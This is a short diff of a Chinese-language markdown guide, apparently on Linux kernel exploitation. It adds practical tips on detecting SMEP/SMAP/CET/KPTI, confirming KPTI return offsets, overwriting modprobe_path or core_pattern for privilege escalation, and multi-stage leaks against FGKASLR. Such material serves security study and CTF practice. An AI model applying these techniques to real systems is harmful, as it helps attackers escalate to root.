-**Common pitfall:** If the exploit uses `setxattr()` with a file path, ensure the file exists in the remote environment. Local path (`/tmp/exploit`) may differ from remote path (`/home/user/exploit`).
+**坑**：如果利用里用 `setxattr()` 带文件路径，确认该文件在远端存在——本地 `/tmp/exploit` 和远端 `/home/user/exploit` 不是一回事。
+
+---
+
+## 11. 纪律
+
+- **先确认开了哪几层保护**：`cat /proc/cpuinfo | grep -E "smep|smap|cet"`、`grep -E "KASLR|KPTI|SHADOW_STACK" /boot/config-*`。少确认一层就会在最后一跳崩掉。
+- **KPTI 的 +22 偏移必须反汇编确认**，抄别人的数字换版本就废。
+- **能改数据就不回用户态**：`modprobe_path`/`core_pattern` 比构造完整 KPTI 返回链省事得多。
+- **FGKASLR 一定要多阶段**：单阶段拿不到随机化函数地址。
+- **CET 开着就先想信号帧**：直接 kROP 会在 `RET` 上触发 `#CP`。
+- **调试环境先改 `/init`**：不保留 root，`/proc/modules` 和 `/proc/kallsyms` 都是废的。
